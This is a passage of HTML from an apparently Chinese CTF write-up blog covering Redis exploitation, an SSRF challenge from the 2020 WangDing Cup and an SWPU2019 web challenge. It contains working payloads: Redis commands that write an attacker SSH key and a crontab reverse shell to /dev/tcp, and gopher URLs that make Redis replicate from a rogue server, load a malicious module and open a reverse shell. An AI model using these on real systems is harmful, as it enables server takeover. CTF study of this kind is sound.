class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">flushall</span><br><span class="line">set 1 &#39;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGd9qrfBQqsml+aGC&#x2F;PoXsKGFhW3sucZ81fiESpJ+HSk1ILv+mhmU2QNcopiPiTu+kGqJYjIanrQEFbtL+NiWaAHahSO3cgPYXpQ+lW0FQwStEHyDzYOM3Jq6VMy8PSPqkoIBWc7Gsu6541NhdltPGH202M7PfA6fXyPR&#x2F;BSq30ixoAT1vKKYMp8+8&#x2F;eyeJzDSr0iSplzhKPkQBYquoiyIs70CTp7HjNwsE2lKf4WV8XpJm7DHSnnnu+1kqJMw0F&#x2F;3NqhrxYK8KpPzpfQNpkAhKCozhOwH2OdNuypyrXPf3px06utkTp6jvx3ESRfJ89jmuM9y4WozM3dylOwMWjal root@kali</span><br><span class="line">&#39;</span><br><span class="line">config set dir &#x2F;root&#x2F;.ssh&#x2F;</span><br><span class="line">config set dbfilename authorized_keys</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p>下面的是修改了上面的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">filename=<span class="string">"authorized_keys"</span></span><br><span class="line">shell=<span class="string">"\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDP1+B2rcH7ejmH9znCeQdIshPuCkiA+eAYZwApNT5vimPsk7OrP8Qw6GDKrGskY8N6tTH6YGZiNqxpVtEZIYDhiSnRxoplcGgFmMY9pCjFgUKifrN6xeA4PSuxNtUGpcOKVzs/T8SJaHLEtCzKLMnySZ/xBpMQ4CftbH1LKKNQTZRq0XCICW8q9TtZZhvhCnBqIDRD4EmmRGurObK67PjX4kPo1Ej5fIeEYUDN+tHpRP2t4a5BAgdqs7veoQS0GE6774yLyyD+LmaoiNH9NuymVQ36DZ9jOsofYDG173OKrx4tIHW3/xtYQKwgHq9TNYbmXl/c1n5Y3s1ZJ/i/2YruVcRUSMo0u1GgkNn2PDcSw2h2BGZLHm9tGLHe6mSzCIg59RBIT3SXAXqSxwzwpIlchwN0clpnnAhzd4jkKkl1usorrNL8WTWt6kLrD18SaOOO4mZStRX6nKTL3Wo/6V+A75kUQZZMeLgRxU0vWe3wnSHazwKKpf2WjDaGum3vUw0= root@kali\n\n"</span></span><br><span class="line">path=<span class="string">"/root/.ssh/"</span></span><br></pre></td></tr></table></figure><p>打过去</p><img src="/2020/07/16/redis%E9%85%8D%E7%BD%AE%E5%8F%8ASSRF%E5%88%A9%E7%94%A8/7.png" class=""><p>看一下能不能读到该文件</p><img src="/2020/07/16/redis%E9%85%8D%E7%BD%AE%E5%8F%8ASSRF%E5%88%A9%E7%94%A8/8.png" class=""><p>成功写入了，但是ssh连不上，跟我开始想的一样，应该要两台linux来进行该操作，并且另一台也要装了redis，找了篇文章，有具体操作，大概是这样，看了那些师傅的思路，以及总结，大概率不会碰到这种情况的题<a href="https://www.cnblogs.com/cute-puli/p/10870885.html，这就以后有时间再自己操作了" target="_blank" rel="noopener">https://www.cnblogs.com/cute-puli/p/10870885.html，这就以后有时间再自己操作了</a></p><h4 id="写contrab计划任务反弹shell"><a href="#写contrab计划任务反弹shell" class="headerlink" title="写contrab计划任务反弹shell"></a>写contrab计划任务反弹shell</h4><p>起两台机子，虚拟机上跑，都要装redis</p><p>直接上payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">192.168.1.20:6379&gt;CONFIG SET dir &#x2F;var&#x2F;spool&#x2F;cron &lt;--切换到定时任务目录</span><br><span class="line">OK</span><br><span class="line">192.168.1.20:6379&gt;CONFIG SET dbfilename root   &lt;--生成一个名为root的文件</span><br><span class="line">OK</span><br><span class="line">192.168.1.20:6379&gt;set payload &quot;\n\n*&#x2F;1 * * * * &#x2F;bin&#x2F;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.1.160&#x2F;9999 0&gt;&amp;1\n\n&quot;  &lt;--设置反弹shell</span><br><span class="line">OK</span><br><span class="line">192.168.1.20:6379&gt;save </span><br><span class="line">OK</span><br><span class="line">192.168.1.20:6379&gt;exit</span><br></pre></td></tr></table></figure><img src="/2020/07/16/redis%E9%85%8D%E7%BD%AE%E5%8F%8ASSRF%E5%88%A9%E7%94%A8/9.png" class=""><p>另一台机子上监听对应端口号，很快就能弹回shell，但是我这有一台是ubuntu，所以弹不回，权限问题，最好还是kali+centos，下次装好了和上面的ssh一块再试试</p><h4 id="主从复制SSRF"><a href="#主从复制SSRF" class="headerlink" title="主从复制SSRF"></a>主从复制SSRF</h4><p>待补充…………………….</p>]]></content>
      
      
      
        <tags>
            
            <tag> redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网鼎杯2020玄武组SSRFMe</title>
      <link href="/2020/07/15/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E7%8E%84%E6%AD%A6%E7%BB%84SSRFMe/"/>
      <url>/2020/07/15/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E7%8E%84%E6%AD%A6%E7%BB%84SSRFMe/</url>
      
        <content type="html"><![CDATA[<p>网鼎杯玄武组的题太淦了，做了一下午，是我太菜了23333<a id="more"></a></p><h3 id="知识预备"><a href="#知识预备" class="headerlink" title="知识预备"></a>知识预备</h3><p>1.不同URL系欸其在一起得到结果不一致产生被利用的可能</p><p>2.redis主从复制</p><p>3.对rogue-server流氓服务器的了解</p><p>4.对gopher协议的了解以及redisSSRF触发主从反弹shell 对的操作</p><h3 id="题解流程"><a href="#题解流程" class="headerlink" title="题解流程"></a>题解流程</h3><p>开题送源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_inner_ip</span><span class="params">($url)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $match_result=preg_match(<span class="string">'/^(http|https|gopher|dict)?:\/\/.*(\/)?.*$/'</span>,$url);</span><br><span class="line">    <span class="keyword">if</span> (!$match_result)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'url fomat error'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        $url_parse=parse_url($url);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>(<span class="keyword">Exception</span> $e)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'url fomat error'</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $hostname=$url_parse[<span class="string">'host'</span>];</span><br><span class="line">    $ip=gethostbyname($hostname);</span><br><span class="line">    $int_ip=ip2long($ip);</span><br><span class="line">    <span class="keyword">return</span> ip2long(<span class="string">'127.0.0.0'</span>)&gt;&gt;<span class="number">24</span> == $int_ip&gt;&gt;<span class="number">24</span> || ip2long(<span class="string">'10.0.0.0'</span>)&gt;&gt;<span class="number">24</span> == $int_ip&gt;&gt;<span class="number">24</span> || ip2long(<span class="string">'172.16.0.0'</span>)&gt;&gt;<span class="number">20</span> == $int_ip&gt;&gt;<span class="number">20</span> || ip2long(<span class="string">'192.168.0.0'</span>)&gt;&gt;<span class="number">16</span> == $int_ip&gt;&gt;<span class="number">16</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_request_url</span><span class="params">($url)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (check_inner_ip($url))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> $url.<span class="string">' is inner ip'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        $ch = curl_init();</span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">        $output = curl_exec($ch);</span><br><span class="line">        $result_info = curl_getinfo($ch);</span><br><span class="line">        <span class="keyword">if</span> ($result_info[<span class="string">'redirect_url'</span>])</span><br><span class="line">        &#123;</span><br><span class="line">            safe_request_url($result_info[<span class="string">'redirect_url'</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close($ch);</span><br><span class="line">        var_dump($output);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'url'</span>]))&#123;</span><br><span class="line">    $url = $_GET[<span class="string">'url'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($url))&#123;</span><br><span class="line">        safe_request_url($url);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Please visit hint.php locally.</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里的check_inner_ip()方法中用parse_url()来检验是否为内网IP，如果不是内网ip就调用curl的方法请求url返回结果。</p><p>关于这两者一起用的时候产生的漏洞，找了一篇文章<a href="https://www.anquanke.com/post/id/86527，借用文章里的图来说明" target="_blank" rel="noopener">https://www.anquanke.com/post/id/86527，借用文章里的图来说明</a></p><img src="/2020/07/15/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E7%8E%84%E6%AD%A6%E7%BB%84SSRFMe/1.png" class=""><p>这里curl的目标是evil.com:80,php_url_parse处理目标是google.com，这里用这种形式并没有成功访问到hint.php文件，换种方式，用0.0.0.0代表本机所有的ipv4的地址</p><img src="/2020/07/15/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E7%8E%84%E6%AD%A6%E7%BB%84SSRFMe/2.png" class=""><p>这里拿到了redis的pass为root</p><p>下面要用redis主从复制，这篇文章详细介绍了redis种ssrf利用的方法，这里要用到gopher协议</p><p>下面就开始操作，buu上开台内网靶机，下面是网上嫖的流程图</p><img src="/2020/07/15/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E7%8E%84%E6%AD%A6%E7%BB%84SSRFMe/3.png" class=""><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;都要二次url编码</span><br><span class="line">gopher:&#x2F;&#x2F;0.0.0.0:6379&#x2F;_auth root</span><br><span class="line">config set dir &#x2F;tmp&#x2F;</span><br><span class="line">quit</span><br><span class="line">gopher:&#x2F;&#x2F;0.0.0.0:6379&#x2F;_auth%2520root%250aconfig%2520set%2520dir%2520%252ftmp%252f%250aquit</span><br><span class="line"></span><br><span class="line">gopher:&#x2F;&#x2F;0.0.0.0:6379&#x2F;_auth root</span><br><span class="line">config set dbfilename exp.so</span><br><span class="line">slaveof 174.2.65.88 6666</span><br><span class="line">quit</span><br><span class="line">gopher:&#x2F;&#x2F;0.0.0.0:6379&#x2F;_auth%2520root%250aconfig%2520set%2520dbfilename%2520exp.so%250aslaveof%2520174.2.65.88%25206666%250aquit</span><br><span class="line">gopher:&#x2F;&#x2F;0.0.0.0:6379&#x2F;_auth root</span><br><span class="line">module load &#x2F;tmp&#x2F;exp.so</span><br><span class="line">system.rev 174.2.65.88 6663</span><br><span class="line">quit</span><br><span class="line">gopher:&#x2F;&#x2F;0.0.0.0:6379&#x2F;_auth%2520root%250amodule%2520load%2520&#x2F;tmp&#x2F;exp.so%250asystem.rev%2520174.2.65.88%25206663%250aquit</span><br></pre></td></tr></table></figure><p>在靶机上起一下redis，这里用的是<a href="https://github.com/xmsec/redis-ssrf的伪服务，https://github.com/n0b0dyCN/redis-rogue-server用的这里的exp.so文件" target="_blank" rel="noopener">https://github.com/xmsec/redis-ssrf的伪服务，https://github.com/n0b0dyCN/redis-rogue-server用的这里的exp.so文件</a></p><img src="/2020/07/15/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E7%8E%84%E6%AD%A6%E7%BB%84SSRFMe/4.png" class=""><p>将上面三个命令挨个传给url并访问，并且在靶机新开一个页面监听6663端口，这时候发现成功弹回shell，下面就是常规操作，看一下根目录下的文件，直接读flag文件</p><img src="/2020/07/15/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E7%8E%84%E6%AD%A6%E7%BB%84SSRFMe/5.png" class=""><p>收获极大，还需要好好消化2333</p>]]></content>
      
      
      
        <tags>
            
            <tag> buu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SWPU2019web6</title>
      <link href="/2020/07/14/SWPU2019web6/"/>
      <url>/2020/07/14/SWPU2019web6/</url>
      
        <content type="html"><![CDATA[<p>第一步登录框处的考点早上才遇到过<a id="more"></a></p><p>这里还是要用到with rollup,之前的理解有点错误，本地测试了一下明白了，下面是测试的数据</p><img src="/2020/07/14/SWPU2019web6/1.png" class=""><p>构造查询语句的返回结果</p><img src="/2020/07/14/SWPU2019web6/2.png" class=""><p>可以看到有返回一列password为NULL的数据，其他的都跟原始数据一样</p><p>用这个方法可以绕过登录成功</p><img src="/2020/07/14/SWPU2019web6/3.png" class=""><p>登录之后，扫描目录，发现wsdl.php，访问</p><img src="/2020/07/14/SWPU2019web6/4.png" class=""><p>这里有mythod能够传的值，File_read提示要传入什么，应该是filename，先来看看hint里有什么</p><img src="/2020/07/14/SWPU2019web6/5.png" class=""><p>可以看到给了一些文件名，到这里就可以想到用File_read来读取源码了，除了Service.php无权限访问，其他的都可以扒下源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line">index.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ob_start();</span><br><span class="line"><span class="keyword">include</span> (<span class="string">"encode.php"</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">"Service.php"</span>);</span><br><span class="line"><span class="comment">//error_reporting(0);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//phpinfo();</span></span><br><span class="line"></span><br><span class="line">$method = $_GET[<span class="string">'method'</span>]?$_GET[<span class="string">'method'</span>]:<span class="string">'index'</span>;</span><br><span class="line"><span class="comment">//echo 1231;</span></span><br><span class="line">$allow_method = <span class="keyword">array</span>(<span class="string">"File_read"</span>,<span class="string">"login"</span>,<span class="string">"index"</span>,<span class="string">"hint"</span>,<span class="string">"user"</span>,<span class="string">"get_flag"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!in_array($method,$allow_method))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"not allow method"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($method===<span class="string">"File_read"</span>)</span><br><span class="line">&#123;</span><br><span class="line">    $param =$_POST[<span class="string">'filename'</span>];</span><br><span class="line">    $param2=<span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>($method===<span class="string">"login"</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        $param=$_POST[<span class="string">'username'</span>];</span><br><span class="line">        $param2 = $_POST[<span class="string">'passwd'</span>];</span><br><span class="line">    &#125;<span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"method can use"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $method;</span><br><span class="line">$newclass = <span class="keyword">new</span> Service();</span><br><span class="line"><span class="keyword">echo</span> $newclass-&gt;$method($param,$param2);</span><br><span class="line"></span><br><span class="line">ob_flush();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">interface</span>.<span class="title">php</span></span></span><br><span class="line"><span class="class"> &lt;?<span class="title">php</span>   </span></span><br><span class="line">    include('Service.php');</span><br><span class="line">    $ser = <span class="keyword">new</span> SoapServer(<span class="string">'Service.wsdl'</span>,<span class="keyword">array</span>(<span class="string">'soap_version'</span>=&gt;SOAP_1_2));</span><br><span class="line">    $ser-&gt;setClass(<span class="string">'Service'</span>);</span><br><span class="line">    $ser-&gt;handle();</span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">se.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php'</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">aa</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $mod1;</span><br><span class="line">        <span class="keyword">public</span> $mod2;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name,$param)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;$name&#125;)</span><br><span class="line">                &#123;</span><br><span class="line">                    $s1 = <span class="keyword">$this</span>-&gt;&#123;$name&#125;;</span><br><span class="line">                    $s1();</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($ke)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;mod2[$ke];</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">bb</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $mod1;</span><br><span class="line">        <span class="keyword">public</span> $mod2;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;mod1-&gt;test2();</span><br><span class="line">        &#125;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cc</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $mod1;</span><br><span class="line">        <span class="keyword">public</span> $mod2;</span><br><span class="line">        <span class="keyword">public</span> $mod3;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;mod2 = <span class="keyword">$this</span>-&gt;mod3.<span class="keyword">$this</span>-&gt;mod1;</span><br><span class="line">        &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dd</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $name;</span><br><span class="line">        <span class="keyword">public</span> $flag;</span><br><span class="line">        <span class="keyword">public</span> $b;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getflag</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                session_start(); </span><br><span class="line">                var_dump($_SESSION);</span><br><span class="line">                $a = <span class="keyword">array</span>(reset($_SESSION),<span class="keyword">$this</span>-&gt;flag);</span><br><span class="line">                <span class="keyword">echo</span> call_user_func(<span class="keyword">$this</span>-&gt;b,$a);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ee</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $str1;</span><br><span class="line">        <span class="keyword">public</span> $str2;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;str1-&gt;&#123;<span class="keyword">$this</span>-&gt;str2&#125;();</span><br><span class="line">                <span class="keyword">return</span> <span class="string">"1"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = $_POST[<span class="string">'aa'</span>];</span><br><span class="line">unserialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里的encode.php需要读取，后面的解密还要用到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encode.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">en_crypt</span><span class="params">($content,$key)</span></span>&#123;</span><br><span class="line">    $key    =    md5($key);</span><br><span class="line">    $h      =    <span class="number">0</span>;</span><br><span class="line">    $length    =    strlen($content);</span><br><span class="line">    $swpuctf      =    strlen($key);</span><br><span class="line">    $varch   =    <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ($j = <span class="number">0</span>; $j &lt; $length; $j++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ($h == $swpuctf)</span><br><span class="line">        &#123;</span><br><span class="line">            $h = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $varch .= $key&#123;$h&#125;;     </span><br><span class="line">        $h++;</span><br><span class="line">    &#125;</span><br><span class="line">    $swpu  =  <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ($j = <span class="number">0</span>; $j &lt; $length; $j++)</span><br><span class="line">    &#123;</span><br><span class="line">        $swpu .= chr(ord($content&#123;$j&#125;) + (ord($varch&#123;$j&#125;)) % <span class="number">256</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> base64_encode($swpu);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在源码里有一个keyaaaaaaaasdfsaf.txt提示，读取文件是个假的flag，应该是解密用的密钥了：flag{this_is_false_flag}</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decrypt</span><span class="params">($data, $key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $key = md5($key);</span><br><span class="line">    $x = <span class="number">0</span>;</span><br><span class="line">    $data = base64_decode($data);</span><br><span class="line">    $len = strlen($data);</span><br><span class="line">    $l = strlen($key);</span><br><span class="line">    $char = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $len; $i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ($x == $l)</span><br><span class="line">        &#123;</span><br><span class="line">            $x = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $char .= substr($key, $x, <span class="number">1</span>);</span><br><span class="line">        $x++;</span><br><span class="line">    &#125;</span><br><span class="line">    $str = <span 